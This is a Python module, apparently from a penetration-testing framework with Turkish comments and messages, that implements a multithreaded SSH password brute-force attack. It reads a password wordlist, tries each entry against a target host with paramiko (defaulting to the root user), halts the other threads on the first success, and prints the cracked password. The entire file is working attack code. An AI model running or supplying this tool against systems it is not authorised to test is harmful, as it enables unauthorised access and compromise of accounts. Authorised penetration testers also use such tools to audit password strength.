import paramiko
import concurrent.futures
import threading
from typing import Dict, Any
from core.module import BaseModule
from core.option import Option
from rich import print
import os

class ssh_brute(BaseModule):
    """
    Hedef sistemde SSH servisi için bruteforce (şifre deneme) modülü.
    """
    Name = "SSH Brute Forcer"
    Description = "Verilen kullanıcı adı ve parola listesi (Wordlist) ile SSH'a girmeyi dener."
    Author = "Mahmut P."
    Category = "auxiliary/scanner"
    Version = "1.0"

    Requirements = {"python": ["paramiko"]}

    def __init__(self):
        super().__init__()
        self.Options = {
            "RHOST": Option("RHOST", "127.0.0.1", True, "Hedef IP adresi"),
            "RPORT": Option("RPORT", 22, True, "Hedef Port"),
            "USERNAME": Option("USERNAME", "root", True, "Denenecek kullanıcı adı"),
            "WORDLIST": Option("WORDLIST", "config/wordlists/passwords/common.txt", True, "Şifre listesi dosyası"),
            "THREADS": Option("THREADS", 5, True, "Eşzamanlı bağlantı sayısı"),
            "TIMEOUT": Option("TIMEOUT", 5, False, "Bağlantı zaman aşımı (saniye)"),
        }
        for option_name, option_obj in self.Options.items():
            setattr(self, option_name, option_obj.value)
        
        # Sadece auth loglarını bastırmak için
        paramiko.util.log_to_file("paramiko.log", level="ERROR")
        self.stop_event = threading.Event()
        self.success_password = None

    def attempt_login(self, target, port, username, password, timeout):
        """Tek bir parola denemesini gerçekleştirir."""
        if self.stop_event.is_set():
            return None

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(hostname=target, port=port, username=username, password=password, timeout=timeout, auth_timeout=timeout)
            client.close()
            self.stop_event.set()  # Başarılı olursa diğer thread'leri durdur
            return password
        except paramiko.AuthenticationException:
            return None  # Yanlış şifre
        except Exception:
            return None
        finally:
            client.close()
            
    def run(self, options: Dict[str, Any]):
        rhost = options.get("RHOST")
        rport = int(options.get("RPORT", 22))
        username = options.get("USERNAME")
        wordlist_path = options.get("WORDLIST")
        threads = int(options.get("THREADS", 5))
        timeout = float(options.get("TIMEOUT", 5))

        self.stop_event.clear()
        self.success_password = None

        if not os.path.exists(wordlist_path):
            print(f"[bold red][-] Şifre dosyası bulunamadı: {wordlist_path}[/bold red]")
            return False

        print(f"[bold cyan][*] {rhost}:{rport} SSH Bruteforce başlıyor...[/bold cyan]")
        print(f"[bold cyan][*] Kullanıcı Adı: {username}[/bold cyan]")
        print(f"[bold cyan][*] Wordlist: {wordlist_path}[/bold cyan]")

        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[bold red][-] Dosya okunamadı: {e}[/bold red]")
            return False

        if not passwords:
            print(f"[bold yellow][!] {wordlist_path} dosyası boş.[/bold yellow]")
            return False

        print(f"[bold cyan][*] Toplam {len(passwords)} parola denenecek. (Thread: {threads})[/bold cyan]\n")

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_password = {
                executor.submit(self.attempt_login, rhost, rport, username, pw, timeout): pw 
                for pw in passwords
            }
            
            for future in concurrent.futures.as_completed(future_to_password):
                pw = future_to_password[future]
                try:
                    result = future.result()
                    if result:
                        self.success_password = result
                        break
                except Exception:
                    pass

        if self.success_password:
            print(f"\n[bold green][+] BAŞARILI: Giriş sağlandı.[/bold green]")
            print(f"[bold green][+] Kullanıcı Adı:[/bold green] {username}")
            print(f"[bold green][+] Parola:[/bold green] {self.success_password}")
            return True
        else:
            print(f"\n[bold red][-] BAŞARISIZ: Verilen şifrelere listedeki {len(passwords)} şifre arasında eşleşme bulunamadı.[/bold red]")
            return True
